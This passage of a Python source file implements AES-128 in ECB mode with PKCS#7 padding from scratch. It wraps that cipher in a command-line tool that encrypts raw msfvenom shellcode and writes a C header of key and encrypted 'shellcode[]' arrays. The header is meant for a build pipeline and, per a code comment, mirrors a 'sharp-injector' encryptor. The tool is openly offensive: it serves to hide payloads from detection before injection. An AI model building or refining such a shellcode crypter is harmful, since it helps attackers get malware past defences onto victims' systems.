RCON = [0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36]


# --- GF(2^8) and core AES operations ---

def gmult(a, b):
    p = 0
    for _ in range(8):
        if b & 1:
            p ^= a
        hi = a & 0x80
        a = (a << 1) & 0xff
        if hi:
            a ^= 0x1b
        b >>= 1
    return p


def key_expansion(key):
    w = list(key) + [0] * (4 * NB * (NR + 1) - len(key))
    for i in range(NK, NB * (NR + 1)):
        tmp = w[4*(i-1):4*(i-1)+4]
        if i % NK == 0:
            tmp = tmp[1:] + tmp[:1]
            tmp = [SBOX[b] for b in tmp]
            tmp[0] ^= RCON[i // NK]
        for j in range(4):
            w[4*i+j] = w[4*(i-NK)+j] ^ tmp[j]
    return w


def add_round_key(state, w, r):
    for c in range(NB):
        state[NB*0+c] ^= w[4*NB*r + 4*c + 0]
        state[NB*1+c] ^= w[4*NB*r + 4*c + 1]
        state[NB*2+c] ^= w[4*NB*r + 4*c + 2]
        state[NB*3+c] ^= w[4*NB*r + 4*c + 3]


# --- Forward cipher (encrypt) ---

def sub_bytes(state):
    for i in range(16):
        state[i] = SBOX[state[i]]


def shift_rows(state):
    state[NB*1+0], state[NB*1+1], state[NB*1+2], state[NB*1+3] = \
        state[NB*1+1], state[NB*1+2], state[NB*1+3], state[NB*1+0]
    state[NB*2+0], state[NB*2+1], state[NB*2+2], state[NB*2+3] = \
        state[NB*2+2], state[NB*2+3], state[NB*2+0], state[NB*2+1]
    state[NB*3+0], state[NB*3+1], state[NB*3+2], state[NB*3+3] = \
        state[NB*3+3], state[NB*3+0], state[NB*3+1], state[NB*3+2]


def mix_columns(state):
    for j in range(NB):
        c = [state[NB*i+j] for i in range(4)]
        state[NB*0+j] = gmult(0x02, c[0]) ^ gmult(0x03, c[1]) ^ c[2] ^ c[3]
        state[NB*1+j] = c[0] ^ gmult(0x02, c[1]) ^ gmult(0x03, c[2]) ^ c[3]
        state[NB*2+j] = c[0] ^ c[1] ^ gmult(0x02, c[2]) ^ gmult(0x03, c[3])
        state[NB*3+j] = gmult(0x03, c[0]) ^ c[1] ^ c[2] ^ gmult(0x02, c[3])


def aes_cipher(block, w):
    state = [0] * 16
    for i in range(4):
        for j in range(NB):
            state[NB*i+j] = block[i + 4*j]

    add_round_key(state, w, 0)
    for r in range(1, NR):
        sub_bytes(state)
        shift_rows(state)
        mix_columns(state)
        add_round_key(state, w, r)
    sub_bytes(state)
    shift_rows(state)
    add_round_key(state, w, NR)

    out = [0] * 16
    for i in range(4):
        for j in range(NB):
            out[i + 4*j] = state[NB*i+j]
    return bytes(out)


# --- Inverse cipher (decrypt, used for verification) ---

def inv_sub_bytes(state):
    for i in range(16):
        state[i] = INV_SBOX[state[i]]


def inv_shift_rows(state):
    state[NB*1+0], state[NB*1+1], state[NB*1+2], state[NB*1+3] = \
        state[NB*1+3], state[NB*1+0], state[NB*1+1], state[NB*1+2]
    state[NB*2+0], state[NB*2+1], state[NB*2+2], state[NB*2+3] = \
        state[NB*2+2], state[NB*2+3], state[NB*2+0], state[NB*2+1]
    state[NB*3+0], state[NB*3+1], state[NB*3+2], state[NB*3+3] = \
        state[NB*3+1], state[NB*3+2], state[NB*3+3], state[NB*3+0]


def inv_mix_columns(state):
    for j in range(NB):
        c = [state[NB*i+j] for i in range(4)]
        state[NB*0+j] = gmult(0x0e, c[0]) ^ gmult(0x0b, c[1]) ^ gmult(0x0d, c[2]) ^ gmult(0x09, c[3])
        state[NB*1+j] = gmult(0x09, c[0]) ^ gmult(0x0e, c[1]) ^ gmult(0x0b, c[2]) ^ gmult(0x0d, c[3])
        state[NB*2+j] = gmult(0x0d, c[0]) ^ gmult(0x09, c[1]) ^ gmult(0x0e, c[2]) ^ gmult(0x0b, c[3])
        state[NB*3+j] = gmult(0x0b, c[0]) ^ gmult(0x0d, c[1]) ^ gmult(0x09, c[2]) ^ gmult(0x0e, c[3])


def aes_inv_cipher(block, w):
    state = [0] * 16
    for i in range(4):
        for j in range(NB):
            state[NB*i+j] = block[i + 4*j]

    add_round_key(state, w, NR)
    for r in range(NR - 1, 0, -1):
        inv_shift_rows(state)
        inv_sub_bytes(state)
        add_round_key(state, w, r)
        inv_mix_columns(state)
    inv_shift_rows(state)
    inv_sub_bytes(state)
    add_round_key(state, w, 0)

    out = [0] * 16
    for i in range(4):
        for j in range(NB):
            out[i + 4*j] = state[NB*i+j]
    return bytes(out)


# --- ECB mode with PKCS#7 ---

def aes_encrypt_ecb(plaintext, key):
    pad_len = BLOCK_SIZE - (len(plaintext) % BLOCK_SIZE)
    padded = plaintext + bytes([pad_len] * pad_len)

    w = key_expansion(key)
    ct = b""
    for i in range(0, len(padded), BLOCK_SIZE):
        ct += aes_cipher(padded[i:i+BLOCK_SIZE], w)
    return ct


def aes_decrypt_ecb(ciphertext, key):
    w = key_expansion(key)
    pt = b""
    for i in range(0, len(ciphertext), BLOCK_SIZE):
        pt += aes_inv_cipher(ciphertext[i:i+BLOCK_SIZE], w)

    pad = pt[-1]
    if pad == 0 or pad > BLOCK_SIZE or any(b != pad for b in pt[-pad:]):
        raise ValueError("bad PKCS#7 padding")
    return pt[:-pad]


# --- Output ---

def fmt_c_array(data):
    items = ", ".join(f"0x{b:02x}" for b in data)
    return items


def main():
    parser = argparse.ArgumentParser(description="AES-128-ECB encrypt raw shellcode")
    parser.add_argument("input", help="Raw shellcode file (e.g., msfvenom -f raw)")
    parser.add_argument("--header", action="store_true", help="Output as C header for Makefile pipeline")
    parser.add_argument("--key", help="Use specific key file (16 bytes). Default: random")
    args = parser.parse_args()

    try:
        raw = open(args.input, "rb").read()
    except FileNotFoundError:
        print(f"error: {args.input}: not found", file=sys.stderr)
        sys.exit(1)

    if not raw:
        print("error: input file is empty", file=sys.stderr)
        sys.exit(1)

    if args.key:
        key = open(args.key, "rb").read()
        if len(key) != 16:
            print("error: key must be exactly 16 bytes", file=sys.stderr)
            sys.exit(1)
    else:
        key = os.urandom(16)

    enc = aes_encrypt_ecb(raw, key)

    # Verify round-trip (same pattern as sharp-injector Encryptor.cs)
    dec = aes_decrypt_ecb(enc, key)
    if dec != raw:
        print("error: round-trip verification FAILED — encrypt/decrypt mismatch", file=sys.stderr)
        sys.exit(1)

    if args.header:
        print("/* Auto-generated by aes-encoder.py — do not edit */")
        print("#pragma once")
        print(f"unsigned char aes_key[] = {{ {fmt_c_array(key)} }};")
        print(f"unsigned char shellcode[] = {{ {fmt_c_array(enc)} }};")
        print(f"size_t shellcode_len = {len(enc)};")
        print(f"size_t plaintext_len = {len(raw)};")
    else:
        print(f"Key ({len(key)} bytes):")
        print("  " + " ".join(f"{b:02x}" for b in key))
        print(f"Ciphertext ({len(enc)} bytes, plaintext was {len(raw)}):")
        for i in range(0, len(enc), 16):
            print("  " + " ".join(f"{b:02x}" for b in enc[i:i+16]))

    print(f"// {len(raw)}b → {len(enc)}b AES-128-ECB, verified OK", file=sys.stderr)


if __name__ == "__main__":
    main()
